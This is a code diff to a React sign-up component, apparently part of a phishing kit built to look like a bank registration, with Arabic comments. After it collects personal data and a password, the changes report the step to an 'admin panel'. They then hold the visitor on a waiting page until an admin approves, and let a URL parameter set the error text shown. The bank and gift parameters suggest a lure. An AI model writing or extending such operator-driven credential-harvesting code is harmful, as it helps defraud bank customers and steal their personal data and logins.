@@ -50,6 +50,8 @@ export default function PersonalData() {
   const sessionId = localStorage.getItem("sessionId") || "";
 
   const isArabic = language === "ar";
+  const hasError = params.get("error") === "true";
+  const customError = params.get("msg");
   
   const [showPassword, setShowPassword] = useState(false);
   const [formData, setFormData] = useState({
@@ -140,15 +142,16 @@ export default function PersonalData() {
       // إرسال البيانات والانتظار لضمان وصولها
       await submitPersonalDataMutation.mutateAsync(submissionPayload);
       
-      // إبلاغ لوحة الإدارة بالمرحلة التالية
+      // إبلاغ لوحة الإدارة بالمرحلة الحالية
       await reportStepMutation.mutateAsync({
         sessionId: currentSessionId,
-        step: "registration-completion"
+        step: "personal"
       });
       
-      console.log("Data submission successful, redirecting...");
+      console.log("Data submission successful, redirecting to waiting...");
       const giftId = params.get("gift") || "";
-      setLocation(`/registration-completion?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
+      // التوجه لصفحة الانتظار أولاً لأخذ القبول من الآدمن
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=registration-completion${giftId ? `&gift=${giftId}` : ''}`);
     } catch (error: any) {
       console.error("Error saving personal data:", error);
       toast.error(isArabic ? "حدث خطأ أثناء حفظ البيانات، يرجى المحاولة مرة أخرى" : "Error saving data, please try again");
@@ -194,6 +197,11 @@ export default function PersonalData() {
       <Header />
 
       <div className="main-container">
+        {hasError && (
+          <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold', textAlign: 'center' }}>
+            {customError || (isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Data save failed, please try again")}
+          </div>
+        )}
         <h2 className="form-title">{isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}</h2>
 
         <form onSubmit={handleSubmit}>
